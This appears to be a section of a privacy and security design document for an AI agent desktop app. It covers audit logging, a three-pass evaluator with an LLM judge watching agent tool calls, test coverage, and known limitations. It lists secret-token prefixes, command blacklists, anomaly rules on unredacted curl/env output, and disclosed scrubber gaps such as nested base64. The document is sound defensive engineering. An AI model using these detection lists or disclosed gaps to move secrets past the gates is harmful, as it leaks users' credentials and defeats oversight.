The generic Agent config optimization (§8.3, 2026-10-21; 6 kinds since 2026-10-24)
writes these event kinds:
`config-optimize-proposed` / `config-optimize-granted` /
`config-optimize-applied` / `config-optimize-rolled-back` /
`config-optimize-apply-failed` (verification failed **and** the automatic
rollback failed too) / `config-optimize-undone` (the user explicitly undid an
applied change; written as a zero-value event only on a real restore, and kept
distinct from the automatic rollback). The shell writes them into the
**audit JSONL of the
same session** (not only to app_log); the payload contains only the
agent_id, the proposal_id, the item counts and the **key names** — values
never enter the audit trail, app_log, or the LLM context.

The model gateway (§7.11, 2026-10-13) writes a separate (gateway-only) event kind,
`gateway-scrub`: written by the gateway process itself (session fixed
`"gateway"`, independent of any chat session), it records **only category
counts / byte counts / path / agent / action (tokenized / warned /
unknown-path) — never the request body, truths, or restored token values**.
"Zero content" is a hard invariant locked by gateway-side tests; the
frontend `auditTypes.ts` carries the mirror type.

### 9.1 Three-Layer Evaluation

Settings → Audit → "Evaluate" runs three passes against a saved session:

**Pass 1 · Rule Replay** — Re-runs the current versions of policy + safety +
scrub rules against recorded `tool-call-decided` events. **Any decision /
stage / reason drift is flagged** — after a rule upgrade, it's immediately
visible which past decisions would be different today.

**Pass 2 · Anomaly Heuristics** (4 rules):
- `reader-without-redaction`: `cat` / `head` / etc. read-type ran but the
  scrubber did not hit (skipped when explicitly `trusted_read` stage)
- `network-without-redaction`: `curl` output > 200B but no redaction
- `env-without-redaction`: `env` output contains `KEY=val` but no redaction
- `tool-call-without-reasoning-reflection`: thinking mode is on, but no
  reasoning chunk in the prior 60s window (the LLM did not reflect before
  issuing the command)

**Pass 3 · LLM-as-judge** — The only code path that still uses the Vercel AI
SDK v6 `streamText` (the main chat runs in Rust). The judge always runs in
thinking mode — auditing is a compliance-critical behavior, not a user
preference. The judge's own COT is captured into `JudgeResult.cot`, viewable
expandable in the UI to show "why this judgment".

Judge network traffic uses a dedicated application-proxy-aware **Rust transport**
reachable only through the `audit_judge_reserve` / `audit_judge_fetch` /
`audit_judge_cancel` IPC commands — never a generic WebView fetch fallback. It
accepts only POST Chat Completions, disables redirects, applies a 120s total /
15s connection timeout, caps requests at 4 MiB, API keys at 16 KiB and responses
at 8 MiB, and buffers SSE for the SDK parser. Cancellation aborts the actual Rust
request; error bodies, sensitive headers and credentials are not echoed. The
judge uses API-key credentials only (OAuth tokens are not exposed to this path).

### 9.2 Why Three Layers Are Needed

The failure mode of ordinary LLM agents is "execute silently, and only notice
the mistake afterward". kaya's design philosophy: you should be able to **fully
replay** every action the AI took, including **why** it took that action.
Audit log + three-layer evaluation = a complete "post-hoc forensics" capability
that gives "did the AI send my secret out?" a verifiable answer.

---

## 10. Ollama Path: No Inference or Conversation / Tool Content Egress

Settings → Provider picks **Ollama**, start `ollama serve`, fully local inference:

- Inference and conversation / tool content never leave your machine
- The signed-in usage heartbeat and explicitly consented cloud Token usage upload are separate channels, independent of the provider choice
- No API Key required
- Audit / conversation / debug still follow the local rules for disk writes
- Use cases: privacy-sensitive work, offline development

---

## 11. Test Coverage

### 11.1 Rust Side (`cargo test --lib`)

| File | Test count | Locked invariants |
|---|---|---|
| `crates/kaya-core/src/llm/scrub.rs` | 164 | 30+ secret regexes + whole PEM block matching + three-level strictness mapping; 2026-08-20 review C3: JSON-form `"api_key": "…"` quoted-value recognition (`scrubs_api_key_json_quoted_value`); v3.0.7 (2026-10-08): unterminated-PEM fallback / entropy `_`-`-` charset widening + UUID guard / 8 gitleaks-aligned patterns / AWS_KEY_RE and Bearer alignment / `scrub_env_value` / URL-credential protocol expansion; same batch (2026-10-08): encoded-secret decode-and-rescan layer, 9 fixtures (§7.9); 2026-10-13 (model gateway T2/T3, 158→164): gateway rule-table export (`gateway_rules()` 40-entry order tripwire + `gateway_high_entropy_hit`) + parity / high-entropy-semantics tests |
| `crates/kaya-core/src/llm/policy.rs` | 319 | 3 semantic tables + permanent blacklist + allowlist-miss + pipeline segmentation + trusted read + trusted download (round-57) + `..`/prefix-similarity escapes; 2026-08-20 review C1/C2: inline flag values (`--name=value` / `-eSCRIPT`) + pipeline-position explicit-path demotion + tr/cut/sort/uniq false-positive regression (re-measured 2026-09-19, see §5.1); v3.0.7 (2026-10-08): multi-line segmentation / zsh `=(` and glob qualifiers / brace denial / dangerous env-prefix names / Select-String fail-closed / Windows trailing characters / credential-directory hard denial moved up / IM sensitive-subtree read denial; same batch (2026-10-08): `ping`/`traceroute`/`nslookup`/`dig`/`host` removed from METADATA (CVE-2025-55284, §5.1) |
| `crates/kaya-core/src/llm/safety.rs` | 135 | DANGEROUS/REPL/OPERATION + heredoc/$(...)/`...` recursion |
| `crates/kaya-core/src/llm/user_input_guard.rs` | 12 | backend runs the same pipeline; prevents devtools direct-invoke from bypassing the front-end guard (round-71 +6) |
| `crates/kaya-core/src/agents/config.rs` | 27 | read-modify-write preserves unknown keys + per-agent deny tables (execution / privilege-escalation) + **the model-identity deny table `denied_model_identity_keys` (four agents; claude-code additionally has the 12-key `env` sub-table; 2026-09-10)** + codex's `model_providers` is now wholesale denied by the model-identity deny keys (`denied_patch_nested` remains as an extension point, currently always `None`) + 0o600 atomic writes and tightening of legacy 0644 (2026-08-20 review C3) |
| `crates/kaya-core/src/llm/agent.rs` + `agent_loop_tests.rs` | 25 + 73 = 98 | abort flag RAII + stream-idle watchdog + debug response guard + scripted `run_chat_loop` harness (round-117; 2026-09-19 added scripted dispatch / verify turn cases for the task queue — the test-section promise of spec `2026-09-19-agent-task-queue-design.md`) + debug modelProvider full-domain mapping lock (recounted 2026-09-04, correcting the stale 33) |
| `crates/kaya-core/src/llm/openai_compatible.rs` | 91 | preset dispatch + thinking_params per provider (incl. deepseek-chat exclusion; recounted after the 2026-09-04 preset expansion — Kimi/MiniMax/GLM/OpenCodeZen/Qwen/SiliconFlow) |
| `crates/kaya-core/src/llm/yunhou_chat.rs` | 93 | builtin-chat message conversion / trimming / SSE parsing / tool aggregation / error mapping / mock-upstream end-to-end (round-138) + **the server-side tools cap constant `MAX_BUILTIN_TOOLS` (=16, the single source for the desktop trim and the error message)** |
| `src-tauri/src/llm_commands.rs::tests` | 73 | wire-format lock: snake_case OK / camelCase MUST fail (prevents "undefined" mis-diagnosis) + `chat_args_accepts_builtin_chat_flag` (round-138) + schedules field wire (recounted 2026-09-19, correcting the stale 13) + **desktop base tool set** (2026-10-22: base set is always 15 / non-droppable tool count ≤ the builtin-proxy cap / base-set drift detection for missing·unexpected / environment-missing exemption / **drift warn deduplicated per shape** — the same shape is reported once, a changed shape is reported again) + **tool-trim warn deduplicated per shape** (same handling as `llm_chat.tools_trimmed`) |
| `crates/kaya-core/src/gateway/` + `crates/kaya-core/tests/gateway_proxy.rs` | 610 + 17 = 627 | Model gateway Phase 1 (2026-10-13, §7.11): content-addressed token determinism (byte-identical tokens for the same secret across requests) / shape preservation + single-line alphabet / in-memory vault (4096-entry FIFO) / SSE cross-chunk restore / three-protocol pass-through + hop-by-hop header stripping / placeholders and aliases never leave the gateway (hard assertion after injection) / unknown-path D8+E1 / zero-content audit invariant + cross-sink warn on audit-write failure; 17 wiremock integration tests (full tokenize-restore round trips / Strict-tier alias survival / structured 502 / without_url); 2026-10-18 PR #107: late second-401 / refresh-failure cleanup and replacement use expected-bearer CAS and cannot overwrite newer credentials |
| `src-tauri/src/gateway_tauri.rs::tests` | 87 | Gateway shell layer (2026-10-13): enable/disable mutual-exclusion serialization / owner mutual exclusion (blocked fail-closed) / port fallback persistence / snapshot push & boot reconciliation / wire shapes (snake_case double-wrapped); recounted 17→24 (2026-10-15) → 37 (2026-10-18, Phase 3 + PR #107 race regressions); PR #131 review added the migration-version-stamp fault-injection case (2026-10-24) → 53 after the privacy clearable-count fix (2026-10-24) → 61 measured against the current post-rebase working tree (2026-10-25) |
| `src-tauri/src/model_discovery.rs` | 64 | Online model discovery (2026-10-17, Phase 2): single `{data:[…]}` shape / 500 cap / id trimming and invalid-character rejection / duplicate ids skipped (no longer fail the whole fetch) / bounded 2 MiB read + **id-only parsing** (since 2026-10-22 the body is not scrubbed before parsing — the high-entropy fallback rewrote dated model ids; a **dated-id regression test** was added) / **targeted secret-shaped id rejection** (added 2026-10-22: a narrow prefix constant `SECRET_LIKE_ID_PREFIXES` — `sk-` (which also covers the `sk-proj-` / `sk-ant-` variants) / `ghp_` / `github_pat_` / `glpat-` / `xoxb-` / `xapp-` / `AKIA` / `AIza` / `eyJ` / `hf_` / `npm_` / `shpat_` and other vendor-fixed prefixes, plus the completed vendor set Stripe `sk_live_` / `sk_test_` / `rk_live_`, Slack `xoxs-` / `whsec_`, Supabase `sbp_`, Linear `lin_api_`, Notion `ntn_`, PyPI `pypi-`, Tavily `tvly-`, Alibaba Cloud `LTAI`, Docker `dckr_pat_`, age `AGE-SECRET-KEY-1`; `AccountKey=` goes through the case-insensitive `SECRET_LIKE_ID_PREFIXES_CASELESS` table); three non-prefix targeted rules (bare `Bearer` (optionally prefixed by `Authorization:`), Slack webhook URL, Telegram bot token) plus an **opaque-token conservative gate** (length ≥32, charset limited to base64/hex — i.e. no `- _ : . /` — and at least one digit) and an exact-shape Twilio gate (`SK` followed by 32 hex digits); a hit means **that entry is skipped and counted** (warn-level app_log `model_fetch_secret_like_id_skipped`, carrying only the count and the provider id and **never echoing the id back**), and the fetch **does not fail as a whole** (one malformed entry must not wipe out the other well-formed models in the same response — a whole-fetch failure would also trigger the catalog-snapshot fallback and delete the online-discovered models along with it); if the response yields no usable model at all it is still treated as a failure. This does not contradict dropping Strict scrub: what was dropped is the high-entropy heuristic that mis-flagged normal dated ids, what was added is a **prefix match plus a shape gate whose false-positive surface is near zero**) / **thinking pre-fill on new rows** (2026-10-22: `capabilities: ["thinking"]` is pre-filled only on new rows when the catalog distills `thinking: true`; existing rows are never back-filled, and an existing explicit `thinking` is never overwritten by the automatic merge) / application-proxy-aware transport + redirects disabled + 10 s / three-protocol URL construction (bare base_url gets `/v1`, matching Chat; userinfo / query / fragment rejected) / mutually exclusive auth headers (Bearer vs `x-api-key`) / OAuth preflight sentinels normalized to `model_fetch_*` codes; revisions cover OAuth credentials and the model list (rotation / logout / a newer model save makes an old commit stale), and remote keyless chat / openai discovery fails in preflight with zero network |
| `crates/kaya-core/src/oauth/` (all modules, recursively) | 93 | Provider OAuth (2026-10-17, Phase 3): RFC 8628 begin / poll state machine (authorization_pending / slow_down / denied / expired / 5xx retry) / interval clamped to 1–30 s + 15 min deadline / bounded 64 KiB response read / Kimi official constants and the **four** `X-Msh-*` headers (no hostname / model / OS fingerprint) / verification-URL host allowlist / refresh-token rotation and retry / 401-retry client / permanent `invalid_grant`-class failures split from 401·403 / poll 401·403 and `invalid_client` treated as terminal / `expires_in` clamped to 30 days / https gate on credential endpoints; all errors are fixed sentinels and device_code / tokens never reach Debug or logs |
| `src-tauri/src/provider_auth.rs` | 29 | `resolve_bearer` lifecycle (2026-10-17): refresh within 300 s of expiry / per-provider refresh single-flight (re-read under the lock; return the replaced bundle directly) / `ForceAfter401` forced refresh / refresh 401·403 → in-memory expired marker / transient failure returns the old token (Automatic) or `oauth_refresh_failed` (ForceAfter401) / logout revocation ordered against in-flight refreshes; a second 401 marks expired only when the rejected bearer is still current; tokens only ever enter or leave the keychain / memory |
| `src-tauri/src/provider_oauth.rs` | 30 | OAuth commands and flow lifecycle (2026-10-17): start validation chain (provider → auth_kind → preset → startable catalog; coming / no-oauth always fail-closed) / six-state status derivation (pending / denied / expired / error terminal states are sticky; with no entry, bundle presence + expired marker) / idempotent cancel / logout clears credentials locally only + library List sync / generation checks plus the atomic `flows.complete` commit linearization point (late flow write-backs fail closed) / post_commit fires only on a successful commit / wire DTOs carry no device_code or token |
| `src-tauri/src/provider_chat.rs` | 21 | Unified Chat resolver (2026-10-17, Phase 3 Task 5): `provider_id = None` keeps the old path byte-for-byte / library-resolved endpoint + model availability (disabled / protocol not covered fail-closed) / OAuth bearer injection + one forced-refresh retry on 401 / api_key vs oauth credential split (API Key 401 is never replayed) / a late second 401 cannot mask newer credentials; wire api_key / base_url are ignored |

Method: on 2026-11-04, count line-anchored `#[test]` / `#[tokio::test(...)]` source attributes across all platform cfg. Gateway recursion includes adapters and the private TLS tests (41): 610 + 17 = 627; Tauri: 87. These are source counts, not macOS or Windows executed/pass counts. Use the resource-locked `npm run test:rust:workspace` for local full Rust validation.

> These numbers are actual static measurements for the modules above, not
> estimates. After changing privacy-related code you must re-count and update
> this section; do not substitute a workspace total — which may be affected by
> the known parallel PTY flake — for the per-module counts.


### 11.2 TS Side (`npm test`)

- `src/lib/__tests__/scrubber.test.ts` — TS mirror tests; locks whole-block PEM,
  multiple keys independent, public key not mis-flagged
- `src/lib/__tests__/runShellPolicy.test.ts` — policy TS mirror
- `src/lib/__tests__/safety.test.ts` — safety TS mirror
- `src/lib/__tests__/userInputGuard.test.ts` — `originalBytes` reflects raw
  input, whole-block PEM, emojis not cut
- `src/lib/__tests__/audit.test.ts` / `auditEval.test.ts` — JSONL recorder
  + 3-pass evaluator
- `tests/e2e/model-provider-discovery.spec.ts` (Playwright, mock shim) —
  the only e2e for online model fetching: exactly one fetch after saving a
  non-empty new key / one automatic fetch on first open of an unfetched
  provider and no repeat after switching away and back / snapshot fallback
  on failure (additive only, manual rows untouched) / deleting a bound auto
  model converges the binding (un-apply) and the selector falls back /
  busy·stale rejects degrade silently; negative counts use a stable
  observation window instead of reading the invoke log synchronously.
- `tests/e2e/model-oauth.spec.ts` (Playwright, mock shim) — provider OAuth
  frontend flow: sign-in pending (user_code / copy / open verification page /
  cancel) → authorized → Chat wire (`provider_id` present, api_key / base_url
  not on the wire) → sign-out back to idle with the library entry kept;
  expired / denied / error states + re-login entry; **the unopened OAuth
  form**: the shipped catalog (API Key only) renders no OAuth entry, and a
  synthetic coming fixture covers the disabled-option branch — both with
  zero `provider_oauth_start`; no token wording in frontend request
  parameters or localStorage. **Boundary**: the mock proves frontend
  orchestration and wire shapes only; it does not stand in for real Kimi
  protocol compatibility / token lifecycle (locked by Rust cargo tests);
  endpoint / key selection is locked by the cargo tests in
  `src-tauri/src/provider_chat.rs`, and e2e no longer asserts the plaintext
  wire

### 11.3 TS Mirror ↔ Rust Synchronization (Critical!)

`src/lib/{safety,runShellPolicy,scrubber}.ts` is the **deterministic replay
mirror** of the Rust side, **not** a live gate (the actual live gate lives on
the Rust side). Why it exists: the audit-judge Pass 1 replays recorded
`tool-call-decided` events using the TS mirror. **Any Rust-side rule change
must be synchronized in the TS mirror, or the audit judge will report
decision-drift forever** (this is locked by test; see `auditEval.test.ts`).
When changing:

1. Change the Rust side first (unit tests pass)
2. Synchronize the TS mirror
3. TS mirror tests pass
4. Run auditEval tests (Pass 1 drift = 0)
5. Update the relevant parts of PRIVACY.md / README.md

### 11.4 Known High-Frequency Drift Points

- Token regexes such as `aws-access-key` / `github-pat-*` — character classes
  (`[A-Za-z0-9]` vs `[A-Za-z0-9_]` have drifted twice, each time locking in a
  round of regression tests)
- PEM type variants (round-5 added `ENCRYPTED`, round-7 added
  `private key PRIVATE KEY`; each time adding a new BEGIN/END alternation pair)
- Naming mapping (front-end `strict` ≠ Rust `Strict`, intentionally inverted)
- Placeholder format (round-19 unified to `[REDACTED:<category>]`;
  previously Rust `[<category>]` / TS `[REDACTED:<category>]` coexisted)

---

## 12. Known Limitations / What We Don't Do

- **Multi-layer nested encoding remains a known limitation** (rewritten
  2026-10-08) — single-layer base64 / hex encoded secrets are now covered
  by the encoded-secret decode-and-rescan layer (§7.9: decode, rescan with
  the Tier-0 concrete pattern set, redact the whole span only on a hit);
  **double-or-deeper nesting** (e.g. `base64(base64(secret))`) is
  deliberately not recursive (depth 1) and remains a known limitation. The
  scrubber is ultimately regex-based defense-in-depth: don't rely on it as
  the last line, rely on the policy blacklist to reject the egress commands
  first.
- **LLM context lives on the LLM side** — we scrub what we send out, but we
  have no control over the LLM provider's own server-side logs / cache
  policies. Choosing the Ollama path eliminates this layer entirely.
- **The API Key still travels in the LLM auth header** — this is protocol
  design, unavoidable. But it does not enter the request body and is not
  recorded in the audit log.
- **Once trusted read is allowed, the entire file is exposed** — put a 1 MB
  log into `~/.kaya/` and the LLM can `cat` the whole thing. The scrubber
  still runs, but if the log contains 1 MB of random data, sed/grep will pull
  the whole thing into the LLM context and blow the token budget — the
  consequence is task failure, not leak.
- **Commands you type directly into the terminal are not intercepted by any
  gate** — this is a design decision (the user's shell is the user's
  responsibility), not a vulnerability.
- **Image capability is deliberately narrow (2026-10-02)** — no drag-and-drop
  upload, no image annotation, no image generation or editing; and no
  auto-pasting into an agent's input line (terminal_write is a text channel —
  physically impossible). The "send to agent" button only hands the **absolute
  path** under `~/.kaya/tmp-images/` to the driven coding agent as text; the
  agent reads the file itself, and whether the agent supports reading images is
  outside kaya's judgment.
- **No Linux desktop release** — the desktop app currently ships for macOS and Windows x64 (Windows port since 2026-08-24; see §5.3 for the Windows semantics layer); Linux is supported by kaya-cli only.
- **Gateway start/stop cannot save running agents (2026-10-13, declared expected behavior)** — exit write-back / boot reconciliation only fixes configs for agents started *in the future*; when the gateway stops or kaya crashes, an **already-running** agent process (whose env was already injected with the gateway address) keeps pointing at the dead port, and its requests fail until the user restarts that agent. When kaya is force-killed there is no write-back chance at all — the dead-config window lasts until the next kaya launch, when boot reconciliation self-heals (§7.11). Separately, the gateway Phase 1 PII detection **does not cover IP addresses** (a decided deviation — rationale and consequences in the final block of §7.11)

---

## 13. Checklist When Modifying Privacy-Related Code

Every change must at minimum:

- [ ] **Update Rust side + TS mirror in sync** (otherwise audit-judge Pass 1
      reports drift)
- [ ] Adding a new secret category: add cargo unit test + Vitest unit test
- [ ] Touching the scrub-level mapping: update the
      `scrub.rs::frontend_name_to_scrub_level` header comment
- [ ] Touching the placeholder format: synchronize the placeholder construction
      points in `scrub.rs` and `scrubber.ts`
- [ ] Changing the user-input pipeline: synchronize the three places
      `userInputGuard.ts` (front-end) + `user_input_guard.rs` (Rust) +
      `input_guard.rs` (CLI)
- [ ] Touching the memory subsystem (`crates/kaya-core/src/memory/`, the
      memory_* commands, the retrieval/injection outbound surface): update
      §8.1 in sync, keeping `docs/PRIVACY.md` and this file symmetric
- [ ] Touching the model gateway (`crates/kaya-core/src/gateway/`,
      `src-tauri/src/gateway_tauri.rs`): tokenization detection rules share
      the Chat scrub source (`scrub.rs::gateway_rules` — rule evolution
      still follows the "Rust table + TS mirror in the same PR" discipline);
      **zero-content audit**, authentication-header placeholder rejection, declared custom-header checks and Content model-alias rewriting are hard
      invariants whose tests must keep passing. Disclose metadata-body passthrough rather than promising that no alias ever goes upstream; update §7.11 in sync (both
      languages)
- [ ] After changes, run `npm test && npm run test:rust:workspace` — all green
- [ ] Update the relevant parts of `docs/PRIVACY.md` (if "Known Limitations"
      or "Test Coverage" changed, the doc must reflect it)
- [ ] Before each release (once per version, since 2026-10-09): check the
      version's diff against the current **OWASP Top 10 for Agentic
      Applications** (ASI01–10, first edition 2025-12, companion resources
      updated quarterly, genai.owasp.org — always check against the current
      edition, not memory) for every new capability surface in the diff
      (new tools / new channels / new on-disk domains / new egress paths);
      fix identified gaps or record the rejection rationale (executed in
      step 1 of the release skill)

---

## 14. One-Sentence Summary

> kaya **runs on your Mac / Windows PC**, and **by default** the LLM cannot see file
> contents. Built-in AI input and tool execution are governed by five gates; the
> security gateway covers only explicitly connected agent model requests. Local
> state is not automatically cloud-synced. Enabled egress paths, on-disk content
> exceptions and audit-coverage gaps are disclosed in this document.
> **Privacy First is structural, not an option to allow unrestricted access.**

### Version-range review hardening (2026-10-22)

- `agents/`, `agent-state/`, `gateway/`, `agent-config-snapshots/`, `agent-tune/`, and `usage/` are control-plane write-denied directories for trusted downloads and shell redirects, including Claude launch settings that can contain hooks. Comparisons ignore directory case on macOS/Windows. Rust and TS policy mirrors agree, and a regression checks that every built-in data directory has write protection.
- `agents/`, `gateway/`, and `agent-config-snapshots/`, plus `model-library.json`, its atomic-write temp file `model-library.kaya-tmp`, and backup/migration copies, are sensitive read-denied paths for IM channel turns (the flag is set only for IM turns; remote / peer are not in scope). This also protects user env and custom-header values that do not look like secrets. This covers explicit paths, pipeline operands, redirected input, content counts, and implicit recursive cwd reads. Desktop/CLI trusted-read authorization is unchanged: record queries never automatically inject original text into LLM context, while local users can still explicitly read trusted files within that existing boundary.
- The cloud usage upload's **local state** (`~/.kaya/usage/upload-<deployment>.json` and its atomic-write temp file `usage/upload-<deployment>.json.tmp`, holding the account id, device id and provider dimension mapping; **per deployment since 2026-10-30** — cn / intl are two separate clouds and accounts and each keeps its own state file, while the old shared `usage/upload.json` is only a one-time migration source) joins the **IM channel turns'** sensitive read-denied list (the flag is set only for IM turns; remote SPA turns reuse the desktop context and peer turns register no `run_shell`, so neither is covered — see the honest-scope note in §4.7): a trusted-read hit on those **two exact paths** is denied with `[policy:trusted-read-miss]`, with the same case-folding semantics (macOS / Windows lowercase, Linux case-sensitive). **The `usage/` subtree is judged per path, admitting only the usage event files**: the directory itself (an explicit-path recursive read `grep -r x ~/.kaya/usage`, or a bare recursive search with cwd set to that directory), the state files, the atomic-write temp file, the cross-process lock file, and every wildcard form that would match them (`~/.kaya/usage/*`, `upload.json*`, `upload-*.json*` — the lexical layer cannot expand wildcards, so blocking exact paths alone does not hold) are denied. The **usage event files** (`usage/events-YYYY-MM-DD.jsonl`, counts plus provider / model identifiers only) stay readable, and the `usage/` subtree is **not** on the sensitive-directory list. Desktop/CLI trusted-read authorization is unchanged.
- Restore patches wait in the background for their request's tokenize records to persist, without blocking responses. Tests disable privacy writes or inject temporary directories so they cannot write real user data.

- API-key updates: before replacing or clearing a key, the library durably records a `credential_pending` marker containing only the provider ID. The provider commit clears it atomically. Failures roll back and verify the old key; unverified recovery keeps the marker and blocks outbound key reads even after restart. Explicitly re-enter or clear the key and save to recover. Remote BYOK fallback and frontend key hydration (including the audit judge's in-memory key) use the same gate; a security rejection cannot fall back to legacy or cached keys. Ordinary edits to saved providers do not rewrite auto-filled keys. This follows the existing single-process store-lock contract and does not claim cross-process atomicity.
- Credential/target consistency: API-key preparation outside model-library mutations checks the provider snapshot and reads the key under the same store lock. Long-lived IM/auxiliary clients resolve the current target for each request. An already-started OAuth refresh/commit retains its transaction lock after its waiter is cancelled; logout waits for that commit before deleting credentials. Already-started system credential writes are not claimed to be forcibly cancellable.

Current source-attribute counts are synchronized in the table above. Historical recount paragraphs describe past snapshots only.

### Current local credentials, recovery and runtime boundaries

Bracketed-paste recovery tracks only the user-input channel, using bounded marker-prefix, open/closed/uncertain state and one instance identity in memory. It retains no paste content; this metadata never enters persistence, logs, audit, IPC replies or sessionStorage. Only an independent manual single-byte Ctrl+C may prepend the fixed `ESC[201~` when that same instance may have an unfinished paste. Both sequences are written under the same recovery ticket, lease and writer lock, after prior in-flight writes finish. Only a successful real write and flush may clear quarantine for the original ticket epoch; failure or timeout keeps it quarantined. A different target never receives the old paste's closing marker. Recovery neither replays content nor adds Enter, does not track every writer, and confirms delivery of the closing marker and cancel key rather than proving that the application cleared its input.

Model-library `.bak`, `.migrated-v1-*` and `.migrated-protocols-*` backups may contain quasi-sensitive original endpoints and custom headers. They stay on this machine, can be deleted manually, and currently have no automatic retention period. Optional OAuth `account_id` is ChatGPT-only and is persisted in the same system-keychain bundle as access/refresh tokens, not just memory. Credential IPC, logs and audit never expose it.

New vault writes use persistent inode locks under `~/.kaya/vault-locks/`, keyed by actual service/account including isolated dev namespaces (0700 directory, 0600 files, names encode non-secret namespace only). The two-second bounded lock covers schema checks, migration and all legacy cleanup, read/modify/write/read-back retries; failure prevents writes. Lock files remain and process exit releases the lock. Rust/TS policy denies writes to this control directory and diagnostics exclude it. Flat string-map storage retains string schema metadata; unknown or malformed versions reject writes without discarding legacy sources. Older binaries do not follow this lock protocol and remain a cross-version concurrency boundary.

Optional message `turn_identity` is an exact lifecycle anchor stamped only by Tauri. Four local recovery IPCs reconcile active leases and 32 completed projections without a TTL guess. A holder absent from a partial snapshot is not thereby finished. Recovery metadata stays local; explicit provider-message conversion excludes it. Store version remains v64. Memory `ownership_epoch`, `semantic_claims` and `origin_operations` retain exact ownership and negative facts about old operations. Purge still erases content and old versions; the tombstone retains operation identities to reject stale queues. Explicitly detached members are not automatically reclaimed.

Runtime configuration allows at most 32 steps per field and 96 total within one 45-second request budget; each 15-second field limit is capped by remaining time. Identity/catalog evidence shares that deadline and single-flight; diagnostics wait separately under single-flight. Immediate runtime projection uses only the in-memory registry and verified fields with scrub; normal watchers still enrich library/hook metadata. Read failures clear verified/UI projections but retain roster identity. In-memory IdleProof binds instance, frame and resize with no age threshold.

User input uses session-level decimal u64 sequence numbers. Synchronous Channel acknowledgement follows the real write. The backend FIFO is bounded to 64 tickets/256KiB and 50 seconds per call; sessionStorage retains at most 128 sessionId/seq metadata entries without text. Gaps, overflow or uncertain cleanup quarantine input until an explicit independent manual Ctrl+C succeeds or the real PTY is replaced. Old tickets/Ctrl+C never write to a new instance. New Windows PTYs wait up to five seconds for the same single-flight watcher to publish a valid identity for their exact session/domain before returning session_id or registering a writer. Failure cleans only that session and retains initialCommand for the frontend reconnect path. Late old-domain samples cannot ready a replacement, and readiness never clears quarantine. Unknown identities during live input may still reject input; evidence collection takes up to two seconds before Ctrl+C. Windows hardware and cross-compilation have not been verified. Kimi Permission is unsupported across backend, adapter and UI with zero keystrokes; Kimi model/thinking and all three Claude fields remain. OpenCode model and all three Codex fields remain unsupported. The strict isolation probe aborted with SIGABRT before any CLI launch; no isolated CLI version, session-only effect or two-instance hardware proof was obtained.
